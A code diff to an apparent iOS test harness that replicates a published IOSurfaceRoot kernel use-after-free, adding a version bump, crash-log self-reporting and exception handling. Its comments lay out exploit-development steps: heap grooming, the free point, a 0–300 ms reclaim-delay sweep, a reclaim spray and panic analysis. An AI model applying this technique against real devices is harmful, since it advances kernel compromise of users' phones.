@@ -1,14 +1,14 @@
-// israce v3.8: reclaim delay sweep + nospray control + crash self-report.
-// v3.8 change from the v3.7 panic evidence: the kernel log shows the SAME fault site
+// israce v3.8.1: reclaim delay sweep + nospray control + crash self-report.
+// v3.8.1 change from the v3.7 panic evidence: the kernel log shows the SAME fault site
 // (IOSurface ldr x0,[x0,#0xd8], stale pointer tag 0xf6) but the slot's new tag moved
 // 0xfd -> 0xfe between runs: the reclaim reallocation differs per boot. The dying case's
-// delay lives only in the app's on-device ndjson, so v3.8 parses that file on launch and
+// delay lives only in the app's on-device ndjson, so v3.8.1 parses that file on launch and
 // puts the last unfinished case + its delay on screen for 8 s before resuming, so every
 // crash names its own delay. Baseline trigger replication of the published iOS 27.0.1
 // IOSurfaceRoot registry-node UAF (CVE-2026-112477) on iPhone18,5 / 24A446.
-// v3.8 change from the v3.6 panic evidence: the crash pc was IOSurface's own list-walk deref
+// v3.8.1 change from the v3.6 panic evidence: the crash pc was IOSurface's own list-walk deref
 // (ldr x0,[x0,#0xd8]) on a node whose member pointer was stale (tag 0xf6 vs expected 0xfd),
-// i.e. the slot was already reallocated when the walk ran. v3.8 delays the reclaim spray
+// i.e. the slot was already reallocated when the walk ran. v3.8.1 delays the reclaim spray
 // 0..300 ms after the free (per-iteration sweep, logged as a dly note) to map the window in
 // which the walk still reads the freed-but-not-yet-reused node, and adds a nospray control
 // that never reallocates at all.
@@ -244,7 +244,7 @@ static void freeSpray(void) {
   free(gSpray); gSpray = NULL; gSprayN = 0;
 }
 
-// V_RECLAIM v3.8: groom (create 256, hole every other) -> race window identical to
+// V_RECLAIM v3.8.1: groom (create 256, hole every other) -> race window identical to
 // lockdeg -> IOServiceClose (free point) -> delay sweep (0,1,3,8,20,50,120,300 ms
 // per iteration; the dly note records it) -> 256-surface reclaim spray with varied
 // sizes -> join -> CFRelease(victim). Panic vs survive at a known delay maps when
@@ -331,7 +331,7 @@ static void loadDone(void) {
 static NSString *gResumeKey = nil;
 static int gResumeDlyUs = -1;
 
-// v3.8: parse the ndjson for the last case that has begin without end (the one the panic
+// v3.8.1: parse the ndjson for the last case that has begin without end (the one the panic
 // killed) and the last dly note inside it, so the crash self-reports which delay died.
 static void loadResumeInfo(void) {
   NSString *p = [gDoc stringByAppendingPathComponent:@"israce.ndjson"];
@@ -453,13 +453,13 @@ static void runAll(void) {
   // v3.3: fsync the Documents DIRECTORY once so the files' directory entries are durable across a kernel reset
   { int dfd = open([gDoc UTF8String], O_RDONLY); if (dfd >= 0) { fsync(dfd); close(dfd); } }
   CKPT(@"launch");
-  L(@"probe v3.8 sweep start t=%.3f doc=%@", nowSec(), gDoc);
+  L(@"probe v3.8.1 sweep start t=%.3f doc=%@", nowSec(), gDoc);
   self.window = [[UIWindow alloc] initWithFrame:UIScreen.mainScreen.bounds];
   UIViewController *root = [UIViewController new];
   root.view.backgroundColor = [UIColor blackColor];
   CGRect b = UIScreen.mainScreen.bounds;
   UILabel *lab = [[UILabel alloc] initWithFrame:CGRectMake(16, 80, b.size.width - 32, b.size.height - 160)];
-  lab.text = @"israce v3.8 delay sweep\nreclaim delay 0-300ms + nospray\nphone may reboot if it hits";
+  lab.text = @"israce v3.8.1 delay sweep\nreclaim delay 0-300ms + nospray\nphone may reboot if it hits";
   lab.textColor = [UIColor greenColor];
   lab.numberOfLines = 0;
   lab.font = [UIFont monospacedSystemFontOfSize:14 weight:UIFontWeightRegular];
@@ -468,15 +468,27 @@ static void runAll(void) {
   self.label = lab;
   self.window.rootViewController = root;
   [self.window makeKeyAndVisible];
-  loadDone();
+  @try {
+    loadDone();
+  } @catch (NSException *e) {
+    self.label.text = [NSString stringWithFormat:@"v3.8.1 loadDone threw: %@ / %@", e.name, e.reason];
+    L(@"loadDone exception: %@ / %@", e.name, e.reason);
+    return YES;
+  }
   CKPT(@"resume-loaded");
-  loadResumeInfo();
+  @try {
+    loadResumeInfo();
+  } @catch (NSException *e) {
+    self.label.text = [NSString stringWithFormat:@"v3.8.1 parse threw: %@ / %@", e.name, e.reason];
+    L(@"loadResumeInfo exception: %@ / %@", e.name, e.reason);
+    return YES;
+  }
   if (gResumeKey) {
     NSString *dly = (gResumeDlyUs >= 0) ? [NSString stringWithFormat:@"%d us", gResumeDlyUs] : @"(not logged)";
     self.label.text = [NSString stringWithFormat:@"LAST CRASH: %@\ndelay before spray: %@\nresuming past done cases in 8s...", gResumeKey, dly];
     L(@"resume: last crash case %@ dly=%d", gResumeKey, gResumeDlyUs);
   } else {
-    self.label.text = @"israce v3.8 delay sweep\nreclaim delay 0-300ms + nospray\nphone may reboot if it hits";
+    self.label.text = @"israce v3.8.1 delay sweep\nreclaim delay 0-300ms + nospray\nphone may reboot if it hits";
   }
   double startDelay = gResumeKey ? 8.0 : 0.5;
   dispatch_after(dispatch_time(DISPATCH_TIME_NOW, (int64_t)(startDelay * NSEC_PER_SEC)), dispatch_get_main_queue(), ^{
@@ -500,7 +512,7 @@ static void runAll(void) {
       if (!gSvc) { noteEvent(@"abort", @",\"why\":\"no IOSurfaceRoot service\""); self.label.text = @"no IOSurfaceRoot service"; return; }
       runAll();
       if (!gStop) {
-        L(@"probe v3.8 END (sweep done) passes=%d ok=%d ends=%d", gPass, gOK, gEnds);
+        L(@"probe v3.8.1 END (sweep done) passes=%d ok=%d ends=%d", gPass, gOK, gEnds);
         noteEvent(@"summary", [NSString stringWithFormat:@",\"ran\":%d,\"ends\":%d,\"ok\":%d,\"passes\":%d,\"t\":%.2f", gCaseRan, gEnds, gOK, gPass, nowSec()]);
         self.label.text = [NSString stringWithFormat:@"sweep done\n%d passes, ran %d ok %d\n%.1fs", gPass, gCaseRan, gOK, nowSec()];
         dispatch_after(dispatch_time(DISPATCH_TIME_NOW, (int64_t)(2.0 * NSEC_PER_SEC)), dispatch_get_main_queue(), ^{ exit(0); });
